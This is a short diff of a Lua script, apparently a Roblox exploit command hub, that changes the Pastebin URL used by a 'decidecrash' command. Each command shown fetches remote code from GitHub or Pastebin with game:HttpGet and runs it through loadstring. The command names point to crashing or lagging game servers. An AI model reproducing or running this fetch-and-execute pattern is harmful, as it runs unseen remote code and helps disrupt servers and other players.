@@ -177,7 +177,7 @@ local function EEGJJDT_fake_script() -- TextBox.LocalScript
 					elseif commandName == "bbhub" then
 						loadstring(game:HttpGet("https://raw.githubusercontent.com/Salmon-B0T/SalmonHub/main/SalmonHub.lua", true))()
 					elseif commandName == "decidecrash" then
-						loadstring(game:HttpGet("https://pastebin.com/raw/hMh6MKUU"))()
+						loadstring(game:HttpGet("https://pastebin.com/raw/B0s47RQ4"))()
 					elseif commandName == "decidelag" then
 						loadstring(game:HttpGet("https://pastebin.com/raw/xd1ddLJS"))()
 					elseif commandName == "triviabooth" then
